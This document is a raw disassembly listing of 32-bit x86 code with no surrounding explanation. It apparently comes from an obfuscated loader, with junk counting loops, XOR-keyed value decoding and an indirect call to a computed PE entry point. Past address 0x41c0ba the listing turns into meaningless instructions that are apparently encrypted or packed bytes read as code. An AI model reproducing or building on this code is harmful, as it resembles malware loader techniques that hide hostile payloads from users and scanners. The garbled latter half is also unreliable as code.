  41b7fa:	push   0x4aeb
  41b7ff:	push   0x362c
  41b804:	push   0x611c
  41b809:	call   DWORD PTR ds:0x425044
  41b80f:	cmp    DWORD PTR ds:0x42b010,0x11
  41b816:	jb     0x41b7e0
  41b81c:	and    DWORD PTR ds:0x429020,0x0
  41b826:	jmp    0x41b838
  41b82b:	mov    edi,DWORD PTR ds:0x429020
  41b831:	inc    edi
  41b832:	mov    DWORD PTR ds:0x429020,edi
  41b838:	cmp    DWORD PTR ds:0x429020,0x1b
  41b83f:	jae    0x41b8d2
  41b845:	cmp    DWORD PTR ds:0x429020,0x5
  41b84c:	jne    0x41b86a
  41b852:	push   0x6d5d
  41b857:	push   0x6bd3
  41b85c:	push   0x2a83
  41b861:	push   DWORD PTR [ebp-0x20]
  41b864:	call   DWORD PTR ds:0x425048
  41b86a:	cmp    DWORD PTR ds:0x429020,0x4
  41b871:	jne    0x41b884
  41b877:	mov    edi,DWORD PTR ds:0x429020
  41b87d:	inc    edi
  41b87e:	mov    DWORD PTR ds:0x429020,edi
  41b884:	jmp    0x41b82b
  41b889:	mov    DWORD PTR ds:0x42901c,0x1a
  41b893:	cmp    DWORD PTR ds:0x42901c,0x0
  41b89a:	je     0x41b8d2
  41b8a0:	cmp    DWORD PTR ds:0x42901c,0x29
  41b8a7:	jne    0x41b8b8
  41b8ad:	push   0x3b9c
  41b8b2:	call   DWORD PTR ds:0x42504c
  41b8b8:	xor    edi,edi
  41b8ba:	or     edi,DWORD PTR ds:0x42901c
  41b8c0:	dec    edi
  41b8c1:	mov    DWORD PTR ds:0x42901c,edi
  41b8c7:	jmp    0x41b893
  41b8cc:	sub    DWORD PTR ds:0x429008,ecx
  41b8d2:	mov    DWORD PTR [ebp-0xc],eax
  41b8d5:	and    DWORD PTR ds:0x42d01c,0x0
  41b8df:	mov    edi,DWORD PTR ds:0x42d01c
  41b8e5:	inc    edi
  41b8e6:	mov    DWORD PTR ds:0x42d01c,edi
  41b8ec:	cmp    DWORD PTR ds:0x42d01c,0x13
  41b8f3:	jne    0x41b909
  41b8f9:	push   0x8e10
  41b8fe:	push   0x4244fc
  41b903:	call   DWORD PTR ds:0x425010
  41b909:	cmp    DWORD PTR ds:0x42d01c,0x11
  41b910:	jb     0x41b8df
  41b916:	pop    edi
  41b917:	push   0x424106
  41b91c:	sub    DWORD PTR ds:0x42a018,0x42b000
  41b926:	call   DWORD PTR ds:0x425024
  41b92c:	adc    DWORD PTR ds:0x42c014,0x59ac
  41b936:	push   esi
  41b937:	xor    DWORD PTR ds:0x42d018,0x57bc
  41b941:	push   0x2
  41b943:	add    DWORD PTR ds:0x42a014,0x11b6
  41b94d:	push   0x1
  41b94f:	push   0x2
  41b951:	and    DWORD PTR ds:0x42d004,0x42a01c
  41b95b:	push   0x1
  41b95d:	and    DWORD PTR ds:0x42a004,0x42b014
  41b967:	push   0x8678768
  41b96c:	sbb    DWORD PTR ds:0x42901c,0x42c014
  41b976:	push   0x87676776
  41b97b:	sub    DWORD PTR ds:0x42a008,0x42c014
  41b985:	call   DWORD PTR ds:0x425000
  41b98b:	push   esi
  41b98c:	push   0x68
  41b98e:	push   0xd
  41b990:	push   0x5
  41b992:	push   0x3
  41b994:	push   0x5468787
  41b999:	sub    DWORD PTR ds:0x429014,0x2577
  41b9a3:	call   DWORD PTR ds:0x425008
  41b9a9:	xor    DWORD PTR ds:0x42c00c,0x43e8
  41b9b3:	dec    edi
  41b9b4:	mov    DWORD PTR ds:0x42d008,0x724a
  41b9be:	jne    0x41b917
  41b9c4:	push   0x42411a
  41b9c9:	push   esi
  41b9ca:	push   esi
  41b9cb:	call   DWORD PTR ds:0x425038
  41b9d1:	or     DWORD PTR ds:0x42b004,0x42b00c
  41b9db:	test   eax,eax
  41b9dd:	je     0x41ba3c
  41b9e3:	add    DWORD PTR ds:0x429008,edx
  41b9e9:	mov    eax,ds:0x75687681
  41b9ee:	and    DWORD PTR ds:0x429024,0x0
  41b9f8:	mov    ebx,DWORD PTR ds:0x429024
  41b9fe:	inc    ebx
  41b9ff:	mov    DWORD PTR ds:0x429024,ebx
  41ba05:	cmp    DWORD PTR ds:0x429024,0x24
  41ba0c:	jne    0x41ba1e
  41ba12:	push   DWORD PTR [ebp-0x24]
  41ba15:	push   DWORD PTR [ebp-0x18]
  41ba18:	call   DWORD PTR ds:0x425018
  41ba1e:	cmp    DWORD PTR ds:0x429024,0x1e
  41ba25:	jb     0x41b9f8
  41ba2b:	add    DWORD PTR ds:0x42d000,ebx
  41ba31:	imul   eax,eax,0x5463da19
  41ba37:	mov    ds:0x75687681,eax
  41ba3c:	not    eax
  41ba3e:	mov    eax,DWORD PTR [ebp-0xc]
  41ba41:	mov    ebx,DWORD PTR ds:0x42b010
  41ba47:	mov    ebx,0xf89c85b6
  41ba4c:	cmp    eax,ebx
  41ba4e:	mov    DWORD PTR ds:0x42d01c,0x2eca
  41ba58:	jne    0x41baa0
  41ba5e:	add    DWORD PTR ds:0x429018,0x42a018
  41ba68:	mov    DWORD PTR ds:0x424102,0xf89c85b5
  41ba72:	or     DWORD PTR ds:0x42b01c,0x42c010
  41ba7c:	push   DWORD PTR [ebp+0x10]
  41ba7f:	push   DWORD PTR [ebp+0xc]
  41ba82:	push   DWORD PTR [ebp+0x8]
  41ba85:	call   0x408413
  41ba8a:	adc    edi,edi
  41ba8c:	mov    ecx,DWORD PTR ds:0x423ff2
  41ba92:	mov    ecx,DWORD PTR [ecx+0x1cc]
  41ba98:	sbb    esi,0x7064
  41ba9e:	mov    DWORD PTR [ecx],eax
  41baa0:	mov    DWORD PTR [ebp-0x4],ebx
  41baa3:	add    esi,0x7033
  41baa9:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  41bab0:	and    DWORD PTR ds:0x42d000,0x0
  41baba:	jmp    0x41bace
  41babf:	xor    ecx,ecx
  41bac1:	add    ecx,DWORD PTR ds:0x42d000
  41bac7:	inc    ecx
  41bac8:	mov    DWORD PTR ds:0x42d000,ecx
  41bace:	cmp    DWORD PTR ds:0x42d000,0x1d
  41bad5:	jae    0x41bb24
  41badb:	cmp    DWORD PTR ds:0x42d000,0x9
  41bae2:	jne    0x41bafb
  41bae8:	push   0x42b01c
  41baed:	push   DWORD PTR [ebp-0x1c]
  41baf0:	push   0x424408
  41baf5:	call   DWORD PTR ds:0x42501c
  41bafb:	cmp    DWORD PTR ds:0x42d000,0x8
  41bb02:	jne    0x41bb15
  41bb08:	mov    ecx,DWORD PTR ds:0x42d000
  41bb0e:	inc    ecx
  41bb0f:	mov    DWORD PTR ds:0x42d000,ecx
  41bb15:	jmp    0x41babf
  41bb1a:	mov    DWORD PTR ds:0x42a01c,0x231b
  41bb24:	lea    eax,[ebp-0x28]
  41bb27:	and    DWORD PTR ds:0x42c008,0x0
  41bb31:	mov    edi,DWORD PTR ds:0x42c008
  41bb37:	inc    edi
  41bb38:	mov    DWORD PTR ds:0x42c008,edi
  41bb3e:	cmp    DWORD PTR ds:0x42c008,0x17
  41bb45:	jne    0x41bb59
  41bb4b:	push   0x42a00c
  41bb50:	push   DWORD PTR [ebp-0x18]
  41bb53:	call   DWORD PTR ds:0x425020
  41bb59:	cmp    DWORD PTR ds:0x42c008,0x10
  41bb60:	jb     0x41bb31
  41bb66:	and    DWORD PTR ds:0x42900c,0x0
  41bb70:	jmp    0x41bb84
  41bb75:	xor    ecx,ecx
  41bb77:	or     ecx,DWORD PTR ds:0x42900c
  41bb7d:	inc    ecx
  41bb7e:	mov    DWORD PTR ds:0x42900c,ecx
  41bb84:	cmp    DWORD PTR ds:0x42900c,0x1b
  41bb8b:	jae    0x41bc1f
  41bb91:	cmp    DWORD PTR ds:0x42900c,0x20
  41bb98:	jne    0x41bba7
  41bb9e:	push   DWORD PTR [ebp-0x14]
  41bba1:	call   DWORD PTR ds:0x425028
  41bba7:	jmp    0x41bb75
  41bbac:	mov    DWORD PTR ds:0x42b00c,0x15
  41bbb6:	cmp    DWORD PTR ds:0x42b00c,0x0
  41bbbd:	je     0x41bc1f
  41bbc3:	cmp    DWORD PTR ds:0x42b00c,0x4
  41bbca:	jne    0x41bbf1
  41bbd0:	push   0x6080
  41bbd5:	push   DWORD PTR [ebp-0x20]
  41bbd8:	push   0x42d004
  41bbdd:	push   0x710d
  41bbe2:	push   DWORD PTR [ebp-0x10]
  41bbe5:	push   DWORD PTR [ebp-0x14]
  41bbe8:	push   DWORD PTR [ebp-0x24]
  41bbeb:	call   DWORD PTR ds:0x42502c
  41bbf1:	cmp    DWORD PTR ds:0x42b00c,0x5
  41bbf8:	jne    0x41bc0d
  41bbfe:	xor    edi,edi
  41bc00:	add    edi,DWORD PTR ds:0x42b00c
  41bc06:	dec    edi
  41bc07:	mov    DWORD PTR ds:0x42b00c,edi
  41bc0d:	mov    edi,DWORD PTR ds:0x42b00c
  41bc13:	dec    edi
  41bc14:	mov    DWORD PTR ds:0x42b00c,edi
  41bc1a:	jmp    0x41bbb6
  41bc1f:	mov    DWORD PTR [ebp-0x20],eax
  41bc22:	movzx  ecx,BYTE PTR ds:0x429028
  41bc29:	xor    ecx,DWORD PTR ds:0x42c00c
  41bc2f:	mov    DWORD PTR ds:0x429028,ecx
  41bc35:	lea    eax,[ebp-0x2c]
  41bc38:	and    DWORD PTR ds:0x429004,0x0
  41bc42:	jmp    0x41bc54
  41bc47:	mov    esi,DWORD PTR ds:0x429004
  41bc4d:	inc    esi
  41bc4e:	mov    DWORD PTR ds:0x429004,esi
  41bc54:	cmp    DWORD PTR ds:0x429004,0x1e
  41bc5b:	jae    0x41bcfb
  41bc61:	cmp    DWORD PTR ds:0x429004,0x7
  41bc68:	jne    0x41bc79
  41bc6e:	push   0x5e54
  41bc73:	call   DWORD PTR ds:0x425030
  41bc79:	cmp    DWORD PTR ds:0x429004,0x6
  41bc80:	jne    0x41bc95
  41bc86:	xor    esi,esi
  41bc88:	xor    esi,DWORD PTR ds:0x429004
  41bc8e:	inc    esi
  41bc8f:	mov    DWORD PTR ds:0x429004,esi
  41bc95:	jmp    0x41bc47
  41bc9a:	and    DWORD PTR ds:0x42b00c,0x0
  41bca4:	jmp    0x41bcb6
  41bca9:	mov    esi,DWORD PTR ds:0x42b00c
  41bcaf:	inc    esi
  41bcb0:	mov    DWORD PTR ds:0x42b00c,esi
  41bcb6:	cmp    DWORD PTR ds:0x42b00c,0x12
  41bcbd:	jae    0x41bcfb
  41bcc3:	cmp    DWORD PTR ds:0x42b00c,0xc
  41bcca:	jne    0x41bcdc
  41bcd0:	push   DWORD PTR [ebp-0x10]
  41bcd3:	push   DWORD PTR [ebp-0x28]
  41bcd6:	call   DWORD PTR ds:0x425034
  41bcdc:	cmp    DWORD PTR ds:0x42b00c,0xb
  41bce3:	jne    0x41bcf6
  41bce9:	mov    esi,DWORD PTR ds:0x42b00c
  41bcef:	inc    esi
  41bcf0:	mov    DWORD PTR ds:0x42b00c,esi
  41bcf6:	jmp    0x41bca9
  41bcfb:	mov    DWORD PTR [ebp-0x1c],eax
  41bcfe:	mov    eax,ds:0x423ff2
  41bd03:	mov    eax,DWORD PTR [eax+0x1c8]
  41bd09:	mov    eax,DWORD PTR [eax]
  41bd0b:	mov    ecx,DWORD PTR [ebp-0x1c]
  41bd0e:	mov    esi,0x7510893
  41bd13:	xor    eax,esi
  41bd15:	mov    edi,0x3272db
  41bd1a:	add    eax,edi
  41bd1c:	mov    DWORD PTR [ecx],eax
  41bd1e:	mov    eax,ds:0x424202
  41bd23:	cmp    eax,0x301ac8f5
  41bd28:	jne    0x41bd4f
  41bd2e:	mov    eax,DWORD PTR [ebp-0x4]
  41bd31:	mov    ecx,DWORD PTR ds:0x423ff2
  41bd37:	mov    ecx,DWORD PTR [ecx+0x198]
  41bd3d:	xor    eax,esi
  41bd3f:	add    eax,edi
  41bd41:	mov    DWORD PTR [ecx],eax
  41bd43:	mov    eax,DWORD PTR [ebp-0x4]
  41bd46:	xor    eax,esi
  41bd48:	add    eax,edi
  41bd4a:	mov    ds:0x424202,eax
  41bd4f:	mov    eax,ds:0x423ff2
  41bd54:	mov    eax,DWORD PTR [eax+0x18c]
  41bd5a:	mov    eax,DWORD PTR [eax]
  41bd5c:	mov    DWORD PTR [ebp-0x30],eax
  41bd5f:	mov    eax,0xf89c85ba
  41bd64:	mov    DWORD PTR [ebp-0x1c],eax
  41bd67:	mov    DWORD PTR [ebp-0x1c],eax
  41bd6a:	mov    DWORD PTR [ebp-0x1c],eax
  41bd6d:	mov    DWORD PTR [ebp-0x1c],ebx
  41bd70:	mov    DWORD PTR [ebp-0x38],eax
  41bd73:	mov    DWORD PTR [ebp-0x38],0xf89c85be
  41bd7a:	mov    ebx,DWORD PTR [ebp-0x4]
  41bd7d:	mov    ecx,DWORD PTR [ebp-0x8]
  41bd80:	mov    edx,DWORD PTR [ebp-0x8]
  41bd83:	xor    edx,esi
  41bd85:	xor    ecx,esi
  41bd87:	add    ecx,edx
  41bd89:	mov    edx,DWORD PTR [ebp-0x8]
  41bd8c:	xor    ebx,esi
  41bd8e:	xor    edx,esi
  41bd90:	add    ebx,edi
  41bd92:	lea    ecx,[ecx+edx*1+0x975891]
  41bd99:	cmp    ebx,ecx
  41bd9b:	ja     0x41bdfc
  41bda1:	mov    eax,DWORD PTR [ebp-0x8]
  41bda4:	xor    eax,esi
  41bda6:	lea    eax,[eax+ebx*1+0x3272db]
  41bdad:	push   eax
  41bdae:	mov    eax,DWORD PTR [ebp-0x1c]
  41bdb1:	xor    eax,esi
  41bdb3:	lea    eax,[ebp+eax*1+0x3272e3]
  41bdba:	push   eax
  41bdbb:	mov    eax,ds:0x423ff2
  41bdc0:	push   DWORD PTR [eax+0x1bc]
  41bdc6:	call   0x40843e
  41bdcb:	mov    eax,DWORD PTR [ebp-0x8]
  41bdce:	xor    eax,esi
  41bdd0:	lea    ebx,[ebx+eax*1+0x3272db]
  41bdd7:	mov    eax,DWORD PTR [ebp-0x8]
  41bdda:	mov    ecx,DWORD PTR [ebp-0x8]
  41bddd:	xor    ecx,esi
  41bddf:	xor    eax,esi
  41bde1:	add    eax,ecx
  41bde3:	mov    ecx,DWORD PTR [ebp-0x8]
  41bde6:	xor    ecx,esi
  41bde8:	lea    eax,[eax+ecx*1+0x975891]
  41bdef:	cmp    ebx,eax
  41bdf1:	jbe    0x41bda1
  41bdf7:	mov    eax,0xf89c85ba
  41bdfc:	mov    ecx,DWORD PTR [ebp+0xc]
  41bdff:	mov    DWORD PTR ds:0x423e76,ecx
  41be05:	mov    ecx,DWORD PTR [ebp+0x10]
  41be08:	mov    DWORD PTR ds:0x4240ca,ecx
  41be0e:	mov    ecx,DWORD PTR ds:0x423e76
  41be14:	mov    edx,DWORD PTR [ebp-0x20]
  41be17:	sub    ecx,edi
  41be19:	xor    ecx,esi
  41be1b:	mov    DWORD PTR [edx],ecx
  41be1d:	mov    edx,DWORD PTR [ebp-0xc]
  41be20:	mov    ecx,0xf89c85b6
  41be25:	cmp    edx,ecx
  41be27:	jne    0x41be52
  41be2d:	lea    eax,[ebp-0x14]
  41be30:	mov    DWORD PTR [ebp-0x24],eax
  41be33:	lea    eax,[ebp+0x4]
  41be36:	mov    DWORD PTR [ebp-0x14],eax
  41be39:	mov    eax,DWORD PTR [ebp-0x14]
  41be3c:	test   eax,eax
  41be3e:	je     0x41bf67
  41be44:	mov    eax,DWORD PTR [ebp-0x10]
  41be47:	mov    eax,DWORD PTR [ebp-0x8]
  41be4a:	lea    eax,[ebp-0x24]
  41be4d:	jmp    0x41bf5e
  41be52:	mov    edx,DWORD PTR [ebp-0x28]
  41be55:	cmp    edx,0xf89c85b5
  41be5b:	je     0x41beb8
  41be61:	mov    edx,DWORD PTR [ebp-0x4]
  41be64:	mov    ebx,DWORD PTR [ebp-0x2c]
  41be67:	xor    edx,esi
  41be69:	add    edx,edi
  41be6b:	cmp    edx,ebx
  41be6d:	je     0x41beb8
  41be73:	mov    eax,ds:0x423ff2
  41be78:	mov    eax,DWORD PTR [eax+0x194]
  41be7e:	mov    ecx,DWORD PTR [eax]
  41be80:	mov    eax,DWORD PTR [ecx+0x3c]
  41be83:	push   DWORD PTR ds:0x4240ca
  41be89:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  41be8d:	push   DWORD PTR ds:0x423e76
  41be93:	add    eax,ecx
  41be95:	mov    ecx,DWORD PTR ds:0x423ff2
  41be9b:	mov    ecx,DWORD PTR [ecx+0x194]
  41bea1:	push   DWORD PTR [ecx]
  41bea3:	call   eax
  41bea5:	mov    ecx,DWORD PTR ds:0x423ff2
  41beab:	mov    ecx,DWORD PTR [ecx+0x1cc]
  41beb1:	mov    DWORD PTR [ecx],eax
  41beb3:	jmp    0x41bf67
  41beb8:	mov    edx,DWORD PTR [ebp-0x4]
  41bebb:	mov    ebx,DWORD PTR [ebp-0x30]
  41bebe:	xor    edx,esi
  41bec0:	add    edx,edi
  41bec2:	cmp    edx,ebx
  41bec4:	jne    0x41bf1d
  41beca:	mov    edx,DWORD PTR [ebp-0x4]
  41becd:	mov    ebx,DWORD PTR ds:0x423ff2
  41bed3:	mov    ebx,DWORD PTR [ebx+0x198]
  41bed9:	xor    edx,esi
  41bedb:	add    edx,edi
  41bedd:	cmp    edx,DWORD PTR [ebx]
  41bedf:	jne    0x41befa
  41bee5:	push   ecx
  41bee6:	mov    ecx,DWORD PTR [ebp-0x4]
  41bee9:	xor    ecx,esi
  41beeb:	add    ecx,edi
  41beed:	push   ecx
  41beee:	push   eax
  41beef:	push   DWORD PTR [ebp-0x8]
  41bef2:	push   DWORD PTR [ebp-0x4]
  41bef5:	call   0x416ab7
  41befa:	push   DWORD PTR [ebp-0x8]
  41befd:	push   DWORD PTR [ebp-0x4]
  41bf00:	call   0x41bf89
  41bf05:	mov    eax,DWORD PTR [ebp-0x4]
  41bf08:	xor    eax,esi
  41bf0a:	add    eax,edi
  41bf0c:	mov    ds:0x424076,eax
  41bf11:	mov    eax,DWORD PTR [ebp-0x4]
  41bf14:	xor    eax,esi
  41bf16:	add    eax,edi
  41bf18:	mov    ds:0x42406e,eax
  41bf1d:	lea    eax,[ebp-0x18]
  41bf20:	mov    DWORD PTR [ebp-0x34],eax
  41bf23:	lea    eax,[ebp+0x4]
  41bf26:	mov    DWORD PTR [ebp-0x18],eax
  41bf29:	mov    eax,DWORD PTR [ebp-0x18]
  41bf2c:	test   eax,eax
  41bf2e:	je     0x41bf67
  41bf34:	mov    DWORD PTR [ebp-0x3c],0xf152c3d
  41bf3b:	mov    DWORD PTR [ebp-0x40],0x712ed08
  41bf42:	mov    DWORD PTR [ebp-0x44],0x373fc2e
  41bf49:	mov    DWORD PTR [ebp-0x48],0x72670a1e
  41bf50:	call   0x411f4d
  41bf55:	mov    eax,DWORD PTR [ebp-0x10]
  41bf58:	mov    eax,DWORD PTR [ebp-0x8]
  41bf5b:	lea    eax,[ebp-0x34]
  41bf5e:	push   eax
  41bf5f:	push   DWORD PTR [ebp-0x4]
  41bf62:	call   0x40f9a6
  41bf67:	mov    eax,ds:0x423ff2
  41bf6c:	push   0x4
  41bf6e:	add    eax,0x1cc
  41bf73:	push   eax
  41bf74:	lea    eax,[ebp-0x10]
  41bf77:	push   eax
  41bf78:	call   0x40843e
  41bf7d:	mov    eax,DWORD PTR [ebp-0x10]
  41bf80:	mov    eax,DWORD PTR [eax]
  41bf82:	pop    edi
  41bf83:	pop    esi
  41bf84:	pop    ebx
  41bf85:	leave  
  41bf86:	ret    0xc
  41bf89:	push   ebp
  41bf8a:	mov    ebp,esp
  41bf8c:	sub    esp,0x98
  41bf92:	mov    eax,DWORD PTR [ebp+0x8]
  41bf95:	inc    ecx
  41bf96:	push   ebx
  41bf97:	sbb    DWORD PTR ds:0x42a014,edx
  41bf9d:	push   esi
  41bf9e:	add    esi,esi
  41bfa0:	push   edi
  41bfa1:	and    DWORD PTR ds:0x42c014,0x0
  41bfab:	jmp    0x41bfbd
  41bfb0:	mov    edi,DWORD PTR ds:0x42c014
  41bfb6:	inc    edi
  41bfb7:	mov    DWORD PTR ds:0x42c014,edi
  41bfbd:	cmp    DWORD PTR ds:0x42c014,0x1f
  41bfc4:	jae    0x41c01b
  41bfca:	cmp    DWORD PTR ds:0x42c014,0xb
  41bfd1:	jne    0x41bfea
  41bfd7:	push   0x42454c
  41bfdc:	push   0x4244de
  41bfe1:	push   DWORD PTR [ebp-0x1c]
  41bfe4:	call   DWORD PTR ds:0x42503c
  41bfea:	cmp    DWORD PTR ds:0x42c014,0xa
  41bff1:	jne    0x41c004
  41bff7:	mov    edi,DWORD PTR ds:0x42c014
  41bffd:	inc    edi
  41bffe:	mov    DWORD PTR ds:0x42c014,edi
  41c004:	jmp    0x41bfb0
  41c009:	mov    esi,DWORD PTR ds:0x42c000
  41c00f:	or     esi,DWORD PTR ds:0x42a000
  41c015:	mov    DWORD PTR ds:0x42c000,esi
  41c01b:	mov    esi,0x7510893
  41c020:	xor    eax,esi
  41c022:	mov    edi,DWORD PTR ds:0x423e22
  41c028:	mov    ecx,DWORD PTR ds:0x423e3e
  41c02e:	sub    edi,ecx
  41c030:	sub    edi,DWORD PTR [edi+ecx*1]
  41c033:	mov    edi,0x3272db
  41c038:	add    eax,edi
  41c03a:	xor    ecx,0x38ef
  41c040:	mov    DWORD PTR [ebp-0x30],eax
  41c043:	mov    eax,ds:0x423e72
  41c048:	mov    DWORD PTR ds:0x429010,0x1f
  41c052:	cmp    DWORD PTR ds:0x429010,0x0
  41c059:	je     0x41c0ad
  41c05f:	cmp    DWORD PTR ds:0x429010,0xf
  41c066:	jne    0x41c081
  41c06c:	push   0x82e0
  41c071:	push   0x7826
  41c076:	push   0x30a6
  41c07b:	call   DWORD PTR ds:0x425040
  41c081:	cmp    DWORD PTR ds:0x429010,0x10
  41c088:	jne    0x41c09b
  41c08e:	mov    ecx,DWORD PTR ds:0x429010
  41c094:	dec    ecx
  41c095:	mov    DWORD PTR ds:0x429010,ecx
  41c09b:	mov    ecx,DWORD PTR ds:0x429010
  41c0a1:	dec    ecx
  41c0a2:	mov    DWORD PTR ds:0x429010,ecx
  41c0a8:	jmp    0x41c052
  41c0ad:	mov    eax,DWORD PTR [eax]
  41c0af:	add    ecx,DWORD PTR ds:0x42a01c
  41c0b5:	jmp    0x41e403
  41c0ba:	icebp  
  41c0bb:	push   ecx
  41c0bc:	inc    edi
  41c0bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c0be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c0bf:	mov    ds:0x413825ab,eax
  41c0c4:	aaa    
  41c0c5:	and    al,0xf0
  41c0c7:	xchg   edi,eax
  41c0c8:	sbb    DWORD PTR [esp+0x516261fd],ebp
  41c0cf:	pop    edi
  41c0d0:	bound  esp,QWORD PTR [edx-0x5d]
  41c0d3:	add    eax,0xba196ba8
  41c0d8:	sub    al,0xaf
  41c0da:	dec    esp
  41c0db:	mov    cl,0x4a
  41c0dd:	mov    bl,0xf4
  41c0e0:	shl    DWORD PTR [edx+eiz*4],cl
  41c0e3:	xchg   edi,eax
  41c0e4:	imul   esp,DWORD PTR [ebp+0x7877b1ae],0xffffffc9
  41c0eb:	lods   eax,DWORD PTR ds:[esi]
  41c0ec:	rcr    BYTE PTR [esp+ebp*4],cl
  41c0ef:	adc    eax,0x55f7a87
  41c0f4:	add    eax,0x3cf8867e
  41c0f9:	or     cl,BYTE PTR [ebx-0x35]
  41c0fc:	mov    al,0xd9
  41c0fe:	aas    
  41c0ff:	and    eax,0x75577a4
  41c104:	iret   
  41c105:	cmp    ecx,DWORD PTR [edi]
  41c107:	inc    DWORD PTR [ecx+0x2]
  41c10a:	cmc    
  41c10b:	mov    ebp,esp
  41c10d:	call   0xf29be224
  41c112:	out    0x78,eax
  41c114:	cmp    al,0x96
  41c116:	ds jp  0x41c0aa
  41c119:	ret    0x6c68
  41c11c:	lods   eax,DWORD PTR ds:[esi]
  41c11d:	scas   eax,DWORD PTR es:[edi]
  41c11e:	push   esp
  41c11f:	xchg   esi,eax
  41c120:	fwait
  41c121:	sub    DWORD PTR [ebx-0x1b],eax
  41c124:	daa    
  41c125:	test   eax,0x649da0ce
  41c12a:	jle    0x41c0af
  41c12c:	push   edi
  41c12d:	aas    
  41c12e:	mov    dl,0xfd
  41c130:	cmp    ebx,0xd69acfd2
  41c136:	outs   dx,BYTE PTR ds:[esi]
  41c137:	cmp    bl,cl
  41c139:	loope  0x41c0e8
  41c13b:	call   0xd508:0xc5f89317
  41c142:	push   ebp
  41c143:	fwait
  41c144:	int    0xd6
  41c146:	add    BYTE PTR [si],ch
  41c149:	mov    DWORD PTR gs:[ebp+eax*1-0xb],edx
  41c14e:	ds aas 
  41c150:	fwait
  41c151:	aaa    
  41c152:	adc    eax,0xcb08bcc0
  41c157:	inc    ebx
  41c158:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c159:	sar    DWORD PTR [ebp-0x27],1
  41c15c:	fnsave [edx+edx*1-0x2f]
  41c160:	hlt    
  41c161:	cdq    
  41c162:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c163:	sahf   
  41c164:	sbb    DWORD PTR [eax],eax
  41c166:	push   ecx
  41c167:	ret    0x4efa
  41c16a:	sti    
  41c16b:	dec    ecx
  41c16c:	xchg   BYTE PTR [eax+0x5c3a115],bl
  41c172:	mov    ecx,0x1fe4861e
  41c177:	test   BYTE PTR [ebx+0x3191af73],ah
  41c17d:	cmp    BYTE PTR [ebp-0x4e9eca30],bh
  41c183:	outs   dx,BYTE PTR ds:[esi]
  41c184:	xor    DWORD PTR [esi],eax
  41c186:	push   edx
  41c187:	jns    0x41c1d5
  41c189:	je     0x41c115
  41c18b:	pop    edx
  41c18c:	fidiv  DWORD PTR [ecx+0x5dde71eb]
  41c192:	dec    esp
  41c193:	gs idiv ah
  41c196:	sub    eax,0x171cfa43
  41c19b:	and    esp,DWORD PTR [esi-0x390335aa]
  41c1a1:	fsubr  st(2),st
  41c1a3:	or     al,dl
  41c1a5:	and    BYTE PTR [ebx],0x82
  41c1a8:	pop    ds
  41c1a9:	mov    eax,ds:0x2623509f
  41c1ae:	(bad)  [edx]
  41c1b0:	add    ebx,DWORD PTR [ecx-0x7b]
  41c1b3:	lds    ebp,FWORD PTR [edx+0x5c20b091]
  41c1b9:	popf   
  41c1ba:	push   0x48
  41c1bc:	out    dx,al
  41c1bd:	ficom  DWORD PTR [ebp+eiz*1+0x4719097d]
  41c1c4:	sbb    dl,BYTE PTR [esi]
  41c1c6:	mov    cl,0x4d
  41c1c8:	jl     0x41c1f8
  41c1ca:	gs jecxz 0x41c210
  41c1cd:	mov    ebp,0x2980b0a8
  41c1d2:	mov    bh,0xd5
  41c1d4:	aad    0x9f
  41c1d6:	aas    
  41c1d7:	test   al,0x26
  41c1d9:	stos   DWORD PTR es:[edi],eax
  41c1da:	push   0xd8c8d14a
  41c1df:	ins    BYTE PTR es:[edi],dx
  41c1e0:	cli    
  41c1e1:	lahf   
  41c1e2:	mov    ch,0x6d
  41c1e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c1e5:	xchg   ebx,eax
  41c1e6:	mov    dl,0x8a
  41c1e8:	push   ebx
  41c1e9:	sti    
  41c1ea:	into   
  41c1eb:	rcl    BYTE PTR [ebp+0x76],0x20
  41c1ef:	and    al,dh
  41c1f1:	into   
  41c1f2:	add    DWORD PTR [ecx+edx*2+0xaea0642],edi
  41c1f9:	hlt    
  41c1fa:	cdq    
  41c1fb:	sub    bl,ch
  41c1fd:	hlt    
  41c1fe:	pop    ds
  41c1ff:	lods   eax,DWORD PTR ds:[esi]
  41c200:	sbb    esp,esp
  41c202:	add    esp,eax
  41c204:	sub    DWORD PTR [ebp+0x4a],edx
  41c207:	pop    ebx
  41c208:	mov    ebp,0x6ec03416
  41c20d:	loop   0x41c191
  41c20f:	xchg   edx,eax
  41c210:	adc    edi,DWORD PTR [esi]
  41c212:	pop    edx
  41c213:	sbb    eax,DWORD PTR [edi+ebp*2]
  41c216:	lahf   
  41c217:	adc    ah,dh
  41c219:	mov    al,0xa7
  41c21b:	and    DWORD PTR [ebp+0x22],esi
  41c21e:	add    BYTE PTR [ebx],cl
  41c220:	add    eax,0x9f35b800
  41c225:	or     ebx,DWORD PTR [edx+esi*4]
  41c228:	push   es
  41c229:	aam    0xa6
  41c22b:	sbb    esi,DWORD PTR [ebx+0x66]
  41c22e:	mov    bl,0xf3
  41c230:	lods   eax,DWORD PTR ds:[esi]
  41c231:	loope  0x41c22c
  41c233:	inc    edx
  41c234:	dec    ebp
  41c235:	data16 fmul DWORD PTR [eax+0x2d829f2e]
  41c23c:	sbb    al,0x25
  41c23e:	ret    
  41c23f:	mov    cs:0x9b613578,eax
  41c245:	cmc    
  41c246:	int3   
  41c247:	sbb    ebp,DWORD PTR [esi]
  41c249:	inc    ecx
  41c24a:	mov    bh,BYTE PTR [ebx+eax*8]
  41c24d:	sub    al,0xef
  41c24f:	fwait
  41c250:	jne    0x41c279
  41c252:	sbb    dh,BYTE PTR [ebx]
  41c254:	xchg   DWORD PTR [eax],esp
  41c256:	not    BYTE PTR [ecx+0xe719dca]
  41c25c:	jno    0x41c295
  41c25e:	jl     0x41c230
  41c260:	ss inc esi
  41c262:	out    dx,al
  41c263:	mov    ah,0x6b
  41c265:	xchg   ebp,eax
  41c266:	test   al,0x78
  41c268:	in     eax,dx
  41c269:	test   DWORD PTR [ebx+0x66],0xa239ee4b
  41c270:	sbb    BYTE PTR [edx+0x18be4b8a],cl
  41c276:	pop    ebx
  41c277:	jge    0x41c240
  41c279:	jl     0x41c253
  41c27b:	in     eax,dx
  41c27c:	fidivr WORD PTR [ebp+ebp*8-0x2e]
